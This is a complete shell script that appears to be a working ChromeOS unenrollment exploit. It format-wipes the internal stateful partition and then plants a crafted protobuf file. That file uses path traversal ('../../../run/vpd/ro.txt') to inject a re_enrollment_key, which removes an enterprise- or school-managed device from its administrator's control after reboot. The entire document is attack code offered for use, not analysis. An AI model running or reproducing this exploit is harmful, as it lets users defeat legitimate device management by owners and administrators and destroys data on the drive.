#!/bin/sh

TMPFILE=$(mktemp)
flashrom -i GBB -r "$TMPFILE" 
futility gbb -g --recoverykey="${TMPFILE}.vbpubk" "$TMPFILE"
keysum=$(futility show "${TMPFILE}.vbpubk" | grep "Key sha1sum" | sed "s/ *Key sha1sum: *//")
rm -f "$TMPFILE" "${TMPFILE}.vbpubk"
[[ "$keysum" =~ ^(7f275e9b2a841aae9a8f2f9f747568d6811ef873|10a46dba75ef67320422fe73148feb321d723cde|95cb0cf50bc56c978911ff5cbfda056bac3f928f|25848abcfbf60ba03d4860a395d370224fc99652)$ ]] || { echo "Unsupported board!"; exit 1; }

stateful_mount="/stateful"

fail(){
	printf "$1\n"
	printf "exiting...\n"
	exit
}

ohyeahitspreseedingtime() {
	printf '\012\271\001\012\043unencrypted/../../../run/vpd/ro.txt\020\213\001\032\216\001\022\213\001serial_number=""\nstable_device_secret_DO_NOT_SHARE=""\nre_enrollment_key="%s"\n' "$1" | base64 | tr -d '\n'
}

get_fixed_dst_drive() {
	local dev
	if [ -z "${DEFAULT_ROOTDEV}" ]; then
		for dev in /sys/block/sd* /sys/block/mmcblk*; do
			if [ ! -d "${dev}" ] || [ "$(cat "${dev}/removable")" = 1 ] || [ "$(cat "${dev}/size")" -lt 2097152 ]; then
				continue
			fi
			if [ -f "${dev}/device/type" ]; then
				case "$(cat "${dev}/device/type")" in
				SD*)
					continue;
					;;
				esac
			fi
			DEFAULT_ROOTDEV="${dev}"
		done
	fi
	if [ -z "${DEFAULT_ROOTDEV}" ]; then
		dev=""
	else
		dev="/dev/$(basename ${DEFAULT_ROOTDEV})"
		if [ ! -b "${dev}" ]; then
			dev=""
		fi
	fi
	echo "${dev}"
}

wipeandmountstate(){
    vgchange -ay
    volgroup=$(vgscan | grep "Found volume group" | awk '{print $4}' | tr -d '"')
	if [ -b "/dev/$volgroup/unencrypted" ]; then
		echo "found volume group: $volgroup"
		mkdir "$stateful_mount"
		mkfs.ext4 -F /dev/$volgroup/unencrypted
        mount /dev/$volgroup/unencrypted "$stateful_mount"
	else
		echo "lvm fail, falling back on p1"
		mkfs.ext4 -F "$intdis_prefix"1 || fail "no stateful could be found/wiped"
        mount "$intdis_prefix"1 "$stateful_mount"
	fi
}

checkcurrentstate(){
    echo "Checking current state..."
    vpdoutput=$(vpd -i RW_VPD -g "powerwash_count" 2>/dev/null)
    if [ "$vpdoutput" = "1" ]; then
        echo "Starting Part 2"
        part2
    else
        echo "Starting Part 1"
        part1
    fi
}

part1(){
    wipeandmountstate
    mkdir -p "$stateful_mount"/unencrypted
    touch "$stateful_mount"/unencrypted/.default_key_stateful_migration
    vpd -i RW_VPD -s "powerwash_count"="1"
    crossystem disable_dev_request=1
    umount "$stateful_mount"
    echo "Rebooting, please re-run this script after the update finishes. It may update multiple times, you need to wait for all of them to finish"
    sleep 10
    reboot -f
}

part2(){
    mkdir /metadata
    mount "$intdis_prefix"11 /metadata
	ohyeahitspreseedingtime "$(hexdump -e '1/1 "%02x"' -v -n 32 /dev/urandom)" > /metadata/preseeder.proto
    chattr +i /metadata/preseeder.proto 
    sync
    umount /metadata
    sync
    vpd -i RW_VPD -d "powerwash_count"
    crossystem disable_dev_request=1
    echo "Go through setup, you will be unenrolled"
    sleep 5
    reboot -f
}

main(){
    . /usr/sbin/write_gpt.sh
    load_base_vars
    intdis=$(get_fixed_dst_drive)
	if echo "$intdis" | grep -q '[0-9]$'; then
		intdis_prefix="$intdis"p
	else
		intdis_prefix="$intdis"
	fi
    clear
	echo "script written by con & crossystem, exploit by crossystem"
    echo 'protowrite, root file write > "unpatch" quicksilver > unenrollment'
    checkcurrentstate
}

main
